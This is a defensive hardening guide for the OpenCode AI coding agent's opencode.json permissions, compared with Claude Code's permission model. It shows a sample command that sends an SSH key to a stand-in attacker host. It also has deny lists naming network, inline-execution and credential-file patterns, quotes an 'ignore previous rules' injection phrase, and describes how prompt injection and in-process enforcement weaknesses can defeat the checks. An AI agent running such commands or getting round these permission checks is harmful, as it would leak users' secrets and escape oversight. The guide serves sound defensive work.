# OpenCode — Local Hardening via opencode.json
## Comparison with Claude Code Permission Model
March 2026

---

## Context: Why Config-Level Hardening Matters (and Why It Isn't Enough)

In the Claude Code security research at securitysandman.com, a core finding was that the
*settings file is the most important and most overlooked attack surface*. The same is true
for OpenCode. Both tools ship with permissive defaults — they are designed for developer
productivity, not adversarial environments. Without explicit configuration, both will silently
execute the majority of AI-directed actions with no user prompt.

This section documents what OpenCode's config system can and cannot do, maps it to the
Claude Code hardening baseline from the blog post, and provides a production-ready
hardened opencode.json.

**Critical caveat upfront:** config-level permissions are one layer. They are enforced
in-process, by the same application they are supposed to restrict. They can be:
- Bypassed by a compromised binary
- Undermined by prompt injection instructing the agent to "ignore previous rules"
- Silently degraded if an auto-update replaces the binary
- Accidentally wiped by running `opencode init` in a project directory

Container isolation (Method 1 and 2 in the install guide) provides a complementary hard
boundary that config-level rules cannot provide on their own.

---

## OpenCode vs Claude Code — Permission System Comparison

| Feature | Claude Code (.claude/settings.json) | OpenCode (opencode.json) |
|---|---|---|
| Config format | JSON | JSONC (JSON with comments) |
| Config locations | Global + project-level | Global (~/.config/opencode/) + project (./opencode.json) |
| Bash permissions | Pattern-matched allow/deny per command | Pattern-matched allow/deny per command ✅ |
| File read restrictions | Path-pattern allow/deny | Path-pattern allow/deny ✅ |
| File edit/write restrictions | Separate allow/deny | Merged under `edit` (covers edit, write, patch, multiedit) ✅ |
| Network (WebFetch) restrictions | `WebFetch(*)` deny | `webfetch` deny with URL pattern matching ✅ |
| Web search restrictions | `WebSearch(*)` deny | `websearch` deny ✅ |
| Default file permission | Permissive | Permissive ⚠️ |
| .env file protection | Must configure manually | Denied by default ✅ |
| MCP server control | `enableAllProjectMcpServers: false` | No equivalent "load all" flag; explicit config required |
| Per-agent permissions | Limited | Full per-agent permission override ✅ |
| Subagent (task) control | No direct control | `task: deny` blocks all subagent spawning ✅ |
| Skills control | N/A | `skill` permission (allow/deny per skill name) ✅ |
| External directory guard | No equivalent | `external_directory: ask` default ✅ |
| Doom-loop protection | No equivalent | `doom_loop: ask` default ✅ |
| Bypass mode | `"defaultMode": "bypassPermissions"` (CRITICAL risk) | No equivalent "bypass all" flag ✅ (no single kill switch) |
| OS-level sandboxing | Linux/macOS only, opt-in | None built-in — requires Docker container |

**Key Difference:** OpenCode has no `bypassPermissions` equivalent — there is no single flag
that disables all prompts at once. This is arguably safer than Claude Code's design, where
one misconfigured line defeats the entire permission model. In OpenCode you have to
explicitly set each tool to `"allow"` to silence prompts for it, which creates more friction
against accidental full-disablement.

**Key Gap:** OpenCode has no OS-level sandbox on Linux/macOS. Claude Code includes AppArmor
and sandbox-exec integration on supported platforms. For OpenCode, Docker is the only path
to OS-level isolation — see the install guide.

---

## What OpenCode Permissions Actually Cover

From the official docs, the full list of controllable permission types:

| Permission Key | What It Controls |
|---|---|
| `read` | File reads (matched by file path pattern) |
| `edit` | All file modifications: edit, write, patch, multiedit |
| `glob` | File glob pattern matching |
| `grep` | Content search (matched by regex pattern) |
| `list` | Directory listing |
| `bash` | Shell command execution (matched by parsed command) |
| `task` | Launching subagents |
| `skill` | Loading agent skills |
| `lsp` | Language server protocol queries |
| `todoread` / `todowrite` | Reading/updating the todo list |
| `webfetch` | Fetching URLs (matched by URL pattern) |
| `websearch` | Web search queries |
| `codesearch` | Code search |
| `external_directory` | Access outside the working directory |
| `doom_loop` | Repeated identical tool calls (circuit breaker) |

---

## Dangerous Default Patterns in OpenCode

These mirror the dangerous Claude Code configs documented in the blog post:

### Full Permission (CRITICAL — avoid)
```jsonc
{
  "permission": "allow"
}
```
This single line grants all tools unconditional execution. Equivalent to
`"defaultMode": "bypassPermissions"` in Claude Code.

### Wildcard Bash (CRITICAL)
```jsonc
{
  "permission": {
    "bash": "allow"
  }
}
```
Allows any shell command without prompting. Same risk as `"allow": ["Bash(*)"]` in Claude Code.
An agent can now silently run: `curl attacker.com/$(cat ~/.ssh/id_rsa | base64)`.

### External Directory Open (HIGH)
```jsonc
{
  "permission": {
    "external_directory": {
      "~/**": "allow"
    }
  }
}
```
Allows tool access to your entire home directory. Exposes SSH keys, AWS credentials,
browser profiles, and all other projects.

### Wildcard WebFetch (HIGH)
```jsonc
{
  "permission": {
    "webfetch": "allow"
  }
}
```
No URL restriction — enables data exfiltration to any endpoint.

---

## Hardened opencode.json — Security Baseline

This configuration is modeled on the Claude Code hardening baseline from
securitysandman.com/2025/10/26/is-claude-code-secure-lets-find-out/,
adapted to OpenCode's permission model.

Save as `~/.config/opencode/opencode.json` for global enforcement across all projects,
or as `./opencode.json` at the project root for project-scoped hardening.

```jsonc
{
  "$schema": "https://opencode.ai/config.json",

  // ---------------------------------------------------------------
  // SECURITY BASELINE — OpenCode Local Hardening
  // Modeled on Claude Code hardening baseline (securitysandman.com)
  // Review and adjust for your project's actual needs.
  // ---------------------------------------------------------------

  // Disable auto-update — pin your version, verify hashes manually
  // See the container install guide for version pinning rationale
  "autoupdate": false,

  "permission": {

    // ── GLOBAL DEFAULT ──────────────────────────────────────────
    // Start with ask-for-everything. Explicitly allow safe patterns below.
    // This is the inverse of OpenCode's default (permissive).
    "*": "ask",

    // ── BASH ────────────────────────────────────────────────────
    // Allowlist: safe read-only and project-local commands only
    // Denylist: network tools, inline execution, obfuscation, destructive ops
    // LAST MATCHING RULE WINS — denies go after allows
    "bash": {
      "*":             "ask",      // default: ask for anything not listed

      // Safe read-only operations
      "git status*":   "allow",
      "git diff*":     "allow",
      "git log*":      "allow",
      "git branch*":   "allow",
      "git show*":     "allow",
      "git blame*":    "allow",
      "ls*":           "allow",
      "pwd":           "allow",
      "which*":        "allow",
      "cat*":          "allow",   // narrow this if needed: "cat src/**"
      "echo*":         "allow",
      "grep*":         "allow",
      "find*":         "allow",
      "wc*":           "allow",

      // Build/test operations (adjust to your stack)
      "npm run*":      "ask",     // ask, not deny — useful but warrants review
      "npm test*":     "ask",
      "npm install":   "ask",     // not wildcard — blocks `npm install attacker-pkg`
      "bun run*":      "ask",
      "go build*":     "ask",
      "go test*":      "ask",

      // ── HARD DENIES ──────────────────────────────────────────
      // Network exfiltration tools
      "curl*":         "deny",
      "wget*":         "deny",
      "nc*":           "deny",
      "ncat*":         "deny",
      "socat*":        "deny",
      "telnet*":       "deny",
      "ssh*":          "deny",
      "scp*":          "deny",
      "ftp*":          "deny",
      "sftp*":         "deny",
      "rsync*":        "deny",

      // Inline code execution (common exfiltration/injection vector)
      "python -c*":    "deny",
      "python3 -c*":   "deny",
      "node -e*":      "deny",
      "ruby -e*":      "deny",
      "perl -e*":      "deny",
      "bash -c*":      "deny",
      "sh -c*":        "deny",
      "eval*":         "deny",
      "exec*":         "deny",

      // Obfuscation patterns
      "base64*":       "deny",
      "*| base64*":    "deny",
      "*|base64*":     "deny",

      // Destructive / privilege
      "rm -rf*":       "deny",
      "sudo*":         "deny",
      "su *":          "deny",
      "chmod 777*":    "deny",
      "chown*":        "deny",

      // Git destructive operations — require explicit human action
      "git push*":     "deny",
      "git commit*":   "deny",    // set to "ask" if you want AI-assisted commits
      "git reset --hard*": "deny",
      "git clean -f*": "deny"
    },

    // ── FILE READ ───────────────────────────────────────────────
    // OpenCode denies .env by default — this block adds more
    "read": {
      "*":                         "allow",  // allow project files
      "*.env":                     "deny",
      "*.env.*":                   "deny",
      "*.env.example":             "allow",  // safe to read
      "**/.env*":                  "deny",
      "**/secrets*":               "deny",
      "**/*.key":                  "deny",
      "**/*.pem":                  "deny",
      "**/*.pfx":                  "deny",
      "**/*.p12":                  "deny",
      "**/id_rsa*":                "deny",
      "**/id_ed25519*":            "deny",
      "**/id_ecdsa*":              "deny",
      "**/.npmrc":                 "deny",
      "**/.pypirc":                "deny",
      "**/database.yml":           "deny",
      "**/config/database.yml":    "deny"
    },

    // ── FILE EDIT/WRITE ─────────────────────────────────────────
    // Covers: edit, write, patch, multiedit
    "edit": {
      "*":              "ask",     // ask before any file modification
      "**/.env*":       "deny",
      "**/*.key":       "deny",
      "**/*.pem":       "deny",
      "**/id_rsa*":     "deny",
      "**/id_ed25519*": "deny",
      "opencode.json":  "deny"    // block self-modification of this config
    },

    // ── NETWORK ──────────────────────────────────────────────────
    // Deny all web access by default — allow specific trusted endpoints if needed
    // Example: "webfetch": { "*": "deny", "https://docs.yourcompany.com/**": "allow" }
    "webfetch":    "deny",
    "websearch":   "deny",
    "codesearch":  "ask",         // code search is lower risk than web fetch

    // ── SUBAGENTS & SKILLS ───────────────────────────────────────
    // Subagent spawning significantly expands attack surface
    // OpenCode-specific: Claude Code has no equivalent granular control
    "task":        "ask",         // require approval before spawning subagents
    "skill":       "ask",         // require approval before loading skills

    // ── EXTERNAL DIRECTORY ───────────────────────────────────────
    // Block all access outside working directory
    // OpenCode defaults this to "ask" — we harden to "deny"
    "external_directory": {
      "*":           "deny"       // explicitly block, don't just ask
    },

    // ── CIRCUIT BREAKER ──────────────────────────────────────────
    // Doom loop protection: ask if the same tool call repeats 3x
    // Helps catch runaway agents or prompt injection loops
    "doom_loop":   "ask"          // OpenCode default — keeping it explicit here
  }
}
```

---

## Per-Agent Hardening (OpenCode-Specific Feature)

OpenCode supports per-agent permission overrides — a capability Claude Code lacks.
This allows a "reader" subagent to have zero write access, or a "reviewer" agent to
have no bash access at all, even if the global config permits those tools.

### Example: Read-only code review agent
Save to: `~/.config/opencode/agents/review.md`

```markdown
---
description: Code review — read-only, no execution
mode: subagent
permission:
  edit: deny
  bash: deny
  webfetch: deny
  websearch: deny
  task: deny
---

You are a code reviewer. You can read files and suggest changes but you cannot
make edits, run commands, or access the internet. Provide feedback as comments only.
```

### Example: Scoped build agent
Save to: `~/.config/opencode/agents/build.md`

```markdown
---
description: Build agent — limited to project build commands
mode: subagent
permission:
  bash:
    "*": "deny"
    "npm run build*": "allow"
    "npm test*": "allow"
    "go build*": "allow"
    "go test*": "allow"
  edit:
    "dist/**": "allow"
    "build/**": "allow"
    "*": "deny"
  webfetch: deny
  websearch: deny
  task: deny
---

You are a build agent. You can only run build and test commands, and write to
build output directories. You cannot access the internet or modify source files.
```

---

## Known Gaps vs Claude Code (OpenCode Limitations)

### 1. No OS-Level Sandbox
Claude Code integrates AppArmor (Linux) and sandbox-exec (macOS) to enforce
filesystem boundaries at the OS level — meaning even a compromised process cannot
escape them. OpenCode has no equivalent. The `external_directory` permission is
enforced in-process only and can be bypassed if the binary itself is compromised.

**Mitigation:** Run inside a Docker container (see install guide).

### 2. In-Process Enforcement Only
All OpenCode permissions are checked by the OpenCode process itself. A sufficiently
sophisticated prompt injection attack could potentially manipulate the agent into
approving its own escalations through the "always" approval mechanism. The blog post
notes this risk: "These permissions are best practice but will lead to users
frustratingly disabling everything."

**Mitigation:** Never use the "always" approval option in adversarial environments.
Use "once" approvals only. Consider setting the most sensitive denies at the
project config level (not just global) so they're version-controlled and auditable.

### 3. `edit: deny` Does Not Block the `write` Tool Independently
As of v1.1.1, OpenCode merged write, edit, patch, and multiedit under the `edit`
permission key. This is correct and simpler than Claude Code's separate `Write()`
tool. However, note that custom tools added via MCP servers may implement their own
write mechanisms outside the `edit` permission path.

**Mitigation:** Audit all MCP servers for custom file-writing tools. Set MCP server
connections explicitly in config and minimize them.

### 4. No "Trusted Code" Separation
Neither OpenCode nor Claude Code distinguish between code in your trusted project
and code in third-party repositories being analyzed. If you ask OpenCode to review
an untrusted repo, malicious comments in that repo have the same prompt injection
attack surface as your own project code.

**Mitigation:** Use a read-only subagent (example above) for reviewing untrusted repos.
Never run the main agent with write and bash permissions against a cloned unknown codebase.

### 5. `autoupdate: false` Is Required (Not Default)
OpenCode defaults to `autoupdate: true`. An auto-update replaces the binary without
repeating the SHA256 verification from your Dockerfile or install process. A compromised
update delivery could silently replace the binary with a malicious one.

**Mitigation:** Set `"autoupdate": false` in your global config and manage version
upgrades manually following the Dockerfile hash-verification process.

---

## Config File Location and Precedence

| Scope | Path | Precedence |
|---|---|---|
| Global | `~/.config/opencode/opencode.json` | Lower — applies everywhere |
| Project | `./opencode.json` (project root) | Higher — overrides global for this project |
| Agent | `~/.config/opencode/agents/<name>.md` or `.opencode/agents/<name>.md` | Highest — overrides both for that agent |

**Security implication:** Any project you open can override your global hardening config
with its own `./opencode.json`. If you clone an untrusted repository that contains a
permissive `opencode.json`, it will override your global security settings for that session.

**Mitigation:** Before opening any cloned or untrusted project in OpenCode, inspect the
project root for an `opencode.json`. Treat it as untrusted configuration.

---

## Summary: OpenCode vs Claude Code Hardening Posture

| Risk Area | Claude Code | OpenCode |
|---|---|---|
| Single "disable all" flag | ✅ Exists (`bypassPermissions`) — high risk | ❌ Does not exist — safer by design |
| Per-agent permissions | Limited | Full per-agent override — more granular ✅ |
| OS-level sandbox | Linux + macOS (built-in) | None — requires Docker |
| .env protection | Manual config required | Default deny ✅ |
| Subagent control | No granular permission | `task: deny/ask` ✅ |
| External directory guard | No equivalent | `external_directory: ask` default ✅ |
| Doom-loop circuit breaker | No equivalent | `doom_loop: ask` ✅ |
| Auto-update safety | Manual disable required | Manual disable required ⚠️ |
| Project config override risk | Present | Present ⚠️ |
| In-process enforcement only | Yes — same limitation | Yes — same limitation ⚠️ |

Both tools share the fundamental limitation that config-level permissions are enforced
by the process they are meant to constrain. The container isolation layer in the install
guide addresses this; the config hardening above is a complementary defense-in-depth
measure, not a standalone solution.

---

## References

- OpenCode Permissions Docs: https://opencode.ai/docs/permissions/
- OpenCode Configuration Schema: https://opencode.ai/config.json
- securitysandman.com Claude Code Security Analysis: https://securitysandman.com/2025/10/26/is-claude-code-secure-lets-find-out/
- OpenCode GitHub Issue #5529: Per-agent filesystem boundaries feature request
- OpenCode DeepWiki: Permissions Reference (anomalyco/opencode)
```
